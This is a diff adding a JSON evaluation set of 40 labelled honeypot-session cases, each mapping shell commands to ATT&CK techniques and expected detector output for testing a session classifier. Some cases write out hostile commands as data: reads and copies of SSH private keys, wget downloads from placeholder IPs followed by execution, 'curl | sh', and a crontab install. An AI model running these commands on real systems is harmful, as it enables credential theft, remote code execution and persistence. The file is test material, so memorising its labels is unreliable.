@@ -1,0 +1,270 @@
+{
+  "schema_version": "stabilization_semantic_evaluation.v1",
+  "evaluation_id": "stabilization-independent-2026-07-30",
+  "labels_frozen_before_execution": true,
+  "authoring_record": {
+    "case_source": "independently authored for stabilization",
+    "copied_from_repository_tests_rules_examples_or_prior_evaluations": false,
+    "final_holdout_may_be_used_for_tuning": false,
+    "independence_limitation": "The same Codex session had already inspected runtime contracts, so evaluator independence is partial rather than organizationally independent."
+  },
+  "metric_contract": {
+    "classification": "exact ATT&CK technique-set labels per session",
+    "typed_operations": "exact operation-type set per session",
+    "eligible_families": "exact activated specialized-family set",
+    "findings": "exact specialized finding-family set",
+    "guidance": "exact specialized advisory-action-family set",
+    "abstention": "no specialized family may be selected when must_abstain is true",
+    "hypotheses": "emitted hypotheses must be falsifiable, reference-resolved, and not contradicted by session evidence"
+  },
+  "cases": [
+    {
+      "case_id": "SE01",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "uptime -p", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1124"], "typed_operations": ["host_uptime_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE02",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "df -h /var", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1083"], "typed_operations": ["filesystem_capacity_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE03",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "uname -srmo", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1082"], "typed_operations": ["system_identity_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE04",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "id -un", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1033"], "typed_operations": ["account_identity_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE05",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "ip -4 route list", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1016"], "typed_operations": ["network_route_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE06",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "ps -eo user,pid,args", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1057"], "typed_operations": ["process_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE07",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "ss -lnt", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1049"], "typed_operations": ["network_socket_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE08",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "getent passwd", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1087.001"], "typed_operations": ["account_database_inspection"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE09",
+      "category": "inspection",
+      "events": [{"kind": "command", "command": "find /opt -maxdepth 2 -type f", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1083"], "typed_operations": ["filesystem_search"], "eligible_families": ["inspection"], "finding_families": ["inspection"], "guidance_families": ["inspection"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE10",
+      "category": "sensitive_read",
+      "events": [{"kind": "command", "command": "sed -n '1,4p' /home/ops/.ssh/id_rsa", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1552.004"], "typed_operations": ["credential_path_read", "file_read"], "eligible_families": ["sensitive_read"], "finding_families": ["sensitive_read"], "guidance_families": ["sensitive_read"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE11",
+      "category": "benign_lookalike",
+      "events": [{"kind": "command", "command": "printf '%s\\n' '/home/ops/.ssh/id_rsa'", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["literal_data_emission"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE12",
+      "category": "benign_lookalike",
+      "events": [{"kind": "command", "command": "stat -- /home/ops/.ssh/id_rsa", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["unknown"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE13",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "printf data > /var/tmp/poc-note", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["file_write", "literal_data_emission"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE14",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "printf more >> /var/tmp/poc-note", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["file_append", "literal_data_emission"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE15",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "truncate -s 0 /var/tmp/poc-note", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["file_modify"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE16",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "mkdir --mode=700 /var/tmp/poc-dir", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["directory_create"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE17",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "chmod 0640 /var/tmp/poc-note", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1222.002"], "typed_operations": ["permission_modify"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE18",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "mv -- /var/tmp/poc-note /var/tmp/poc-renamed", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["file_move"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE19",
+      "category": "filesystem",
+      "events": [{"kind": "command", "command": "rm -f -- /var/tmp/poc-renamed", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1070.004"], "typed_operations": ["file_delete"], "eligible_families": ["filesystem"], "finding_families": ["filesystem"], "guidance_families": ["filesystem"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE20",
+      "category": "shadow_transformation",
+      "events": [{"kind": "command", "command": "printf 'YQ==' | base64 -d", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1140"], "typed_operations": ["decode_transform", "literal_data_emission"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE21",
+      "category": "shadow_collection",
+      "events": [{"kind": "command", "command": "tar -czf /var/tmp/logs.tgz /var/log/auth.log", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1560.001"], "typed_operations": ["archive_create"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE22",
+      "category": "shadow_schedule",
+      "events": [{"kind": "command", "command": "crontab -l", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1053.003"], "typed_operations": ["schedule_inspect"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE23",
+      "category": "shadow_schedule",
+      "events": [{"kind": "command", "command": "printf '17 * * * * /bin/true\\n' | crontab -", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1053.003"], "typed_operations": ["literal_data_emission", "schedule_modify"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE24",
+      "category": "shadow_service",
+      "events": [{"kind": "command", "command": "systemctl is-active ssh", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["service_inspect"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE25",
+      "category": "shadow_service",
+      "events": [{"kind": "command", "command": "systemctl try-restart ssh", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1543.002"], "typed_operations": ["service_modify"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE26",
+      "category": "transfer_attempt",
+      "events": [{"kind": "command", "command": "wget --timeout=3 -O /var/tmp/stage https://198.51.100.8/stage", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1105"], "typed_operations": ["remote_content_access", "transfer_attempt"], "eligible_families": ["transfer_attempt"], "finding_families": ["transfer_attempt"], "guidance_families": ["transfer_attempt"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE27",
+      "category": "direct_transfer",
+      "events": [{"kind": "transfer", "eventid": "cowrie.session.file_download", "url": "https://198.51.100.8/object", "path": "/var/lib/cowrie/downloads/object", "sha256": "b7b93eb9a8dc2f41db6f6c0740fe5ebf7b2ad59e428d010ef73e6f3cce5b34f2"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["transfer_observed"], "eligible_families": ["transfer"], "finding_families": ["transfer"], "guidance_families": ["transfer"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE28",
+      "category": "execution",
+      "events": [{"kind": "command", "command": "sh /var/tmp/runme.sh", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1059.004"], "typed_operations": ["execution_attempt"], "eligible_families": ["execution"], "finding_families": ["execution"], "guidance_families": ["execution"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE29",
+      "category": "failed_action",
+      "events": [{"kind": "command", "command": "sed -n '1p' /home/ops/.ssh/id_rsa", "outcome": "failure"}],
+      "expected": {"classification_techniques": ["T1552.004"], "typed_operations": ["credential_path_read", "file_read"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE30",
+      "category": "unknown_outcome",
+      "events": [{"kind": "command", "command": "sh /var/tmp/maybe.sh", "outcome": "unknown"}],
+      "expected": {"classification_techniques": ["T1059.004"], "typed_operations": ["execution_attempt"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE31",
+      "category": "compound_outcome",
+      "events": [{"kind": "command", "command": "uname -a && rm -f /tmp/ambiguous", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1070.004", "T1082"], "typed_operations": ["file_delete", "system_identity_inspection"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE32",
+      "category": "malformed",
+      "events": [{"kind": "command", "command": "curl \"https://example.invalid/unclosed", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1105"], "typed_operations": ["unknown"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE33",
+      "category": "expansion_dependent",
+      "events": [{"kind": "command", "command": "cat \"$HOME/.ssh/id_rsa\"", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1552.004"], "typed_operations": ["file_read"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE34",
+      "category": "wildcard_path",
+      "events": [{"kind": "command", "command": "cat /home/*/.ssh/id_rsa", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1552.004"], "typed_operations": ["file_read"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE35",
+      "category": "unsupported_copy",
+      "events": [{"kind": "command", "command": "cp /home/ops/.ssh/id_rsa /tmp/key.bak", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1552.004"], "typed_operations": ["unknown"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE36",
+      "category": "context_isolation",
+      "inject_non_authoritative_context": true,
+      "events": [{"kind": "command", "command": "frobnicate --opaque", "outcome": "success"}],
+      "expected": {"classification_techniques": [], "typed_operations": ["unknown"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE37",
+      "category": "multi_family",
+      "events": [
+        {"kind": "command", "command": "id -un", "outcome": "success"},
+        {"kind": "command", "command": "wget -O /var/tmp/linkable https://198.51.100.9/linkable", "outcome": "success"},
+        {"kind": "command", "command": "sh /var/tmp/linkable", "outcome": "success"}
+      ],
+      "expected": {"classification_techniques": ["T1033", "T1059.004", "T1105"], "typed_operations": ["account_identity_inspection", "execution_attempt", "remote_content_access", "transfer_attempt"], "eligible_families": ["execution", "inspection", "transfer_attempt"], "finding_families": ["execution", "inspection", "transfer_attempt"], "guidance_families": ["execution", "inspection", "transfer_attempt"], "must_abstain": false}
+    },
+    {
+      "case_id": "SE38",
+      "category": "contradictory_chain",
+      "events": [
+        {"kind": "command", "command": "wget -O /var/tmp/not-run https://198.51.100.10/not-run", "outcome": "success"},
+        {"kind": "command", "command": "sh /var/tmp/not-run", "outcome": "failure"}
+      ],
+      "expected": {"classification_techniques": ["T1059.004", "T1105"], "typed_operations": ["execution_attempt", "remote_content_access", "transfer_attempt"], "eligible_families": ["transfer_attempt"], "finding_families": ["transfer_attempt"], "guidance_families": ["transfer_attempt"], "must_abstain": false, "maximum_hypothesis_sets": 0}
+    },
+    {
+      "case_id": "SE39",
+      "category": "incomplete",
+      "events": [{"kind": "command", "command": "rm", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1070.004"], "typed_operations": ["unknown"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    },
+    {
+      "case_id": "SE40",
+      "category": "pipe_and_compound",
+      "events": [{"kind": "command", "command": "curl -fsS https://198.51.100.11/pipe | sh", "outcome": "success"}],
+      "expected": {"classification_techniques": ["T1059.004", "T1105"], "typed_operations": ["remote_content_pipe_source", "shell_pipe_execution_attempt", "transfer_attempt"], "eligible_families": [], "finding_families": [], "guidance_families": [], "must_abstain": true}
+    }
+  ]
+}
